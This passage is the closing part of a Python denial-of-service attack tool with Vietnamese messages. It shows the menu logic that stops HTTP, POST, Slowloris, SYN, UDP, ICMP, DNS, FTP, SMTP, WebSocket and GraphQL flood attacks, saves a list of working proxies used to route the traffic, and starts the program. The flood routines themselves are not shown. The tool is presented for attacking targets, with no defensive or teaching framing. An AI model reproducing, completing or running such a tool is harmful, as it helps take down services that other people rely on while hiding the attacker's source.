                print("="*70)
                input()
                
                # Dừng tất cả
                if http_flood:
                    http_flood.stop_flood()
                if post_flood:
                    post_flood.stop_flood()
                if ultra_attack:
                    ultra_attack.stop_attack()
                if slowloris:
                    slowloris.stop_attack()
                if syn_flood:
                    syn_flood.stop_flood()
                if udp_flood:
                    udp_flood.stop_flood()
                if icmp_flood:
                    icmp_flood.stop_flood()
                if dns_flood:
                    dns_flood.stop_flood()
                if ws_flood:
                    ws_flood.stop_flood()
                if graphql_flood:
                    graphql_flood.stop_flood()
                
                print("\n[!] Đã dừng tất cả cuộc tấn công")
        
        elif choice == "18":
            # Dừng tất cả
            if http_flood:
                http_flood.stop_flood()
            if post_flood:
                post_flood.stop_flood()
            if ultra_attack:
                ultra_attack.stop_attack()
            if slowloris:
                slowloris.stop_attack()
            if syn_flood:
                syn_flood.stop_flood()
            if udp_flood:
                udp_flood.stop_flood()
            if icmp_flood:
                icmp_flood.stop_flood()
            if dns_flood:
                dns_flood.stop_flood()
            if ftp_flood:
                ftp_flood.stop_flood()
            if smtp_flood:
                smtp_flood.stop_flood()
            if ws_flood:
                ws_flood.stop_flood()
            if graphql_flood:
                graphql_flood.stop_flood()
            print("[!] Đã dừng tất cả cuộc tấn công")
        
        elif choice == "19":
            # Lưu proxy trước khi thoát
            if proxy_manager and proxy_manager.live_proxies:
                proxy_manager.save_live_proxies(proxy_manager.live_proxies)
                print(f"[+] Đã lưu {len(proxy_manager.live_proxies)} proxy live")
            print("[!] Thoát...")
            sys.exit(0)
        
        else:
            print("[-] Lựa chọn không hợp lệ!")

# ============================================
# KHỞI CHẠY CHƯƠNG TRÌNH
# ============================================
if __name__ == "__main__":
    print_banner()
    main_menu()
